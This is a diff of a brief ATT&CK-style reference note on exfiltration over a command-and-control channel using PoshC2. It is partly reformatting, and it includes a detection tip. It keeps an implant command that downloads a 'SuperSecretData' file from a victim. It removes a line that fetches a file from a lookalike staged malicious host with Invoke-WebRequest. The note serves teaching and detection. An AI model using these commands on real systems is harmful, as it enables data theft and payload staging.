@@ -1,11 +1,10 @@
 # [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041/)
 
-## Exploit Description: 
+## **Exploit Description:** 
+
 Download command in PoshC2
 
-
-## Exploit syntax:
-
+## **Exploit syntax:**
 
 * Download file directly from implant
 ```powershell
@@ -13,12 +12,5 @@ download-file <file path>
 Example: download-file 'C:\\Users\\Public\\SuperSecretData.txt'
 ```
 
-* Download file from staged malicious site/C2 server
-```powershell
-Invoke-WebRequest -Uri "http://www.Gewgle.com" -OutFile "C:\path\file"
-```
-
-
-## Detection Technique:
+## **Detection Technique:**
 * Investigate powershell with the “download” command. Investigate increased data transfer external to the network during a network connection.
-
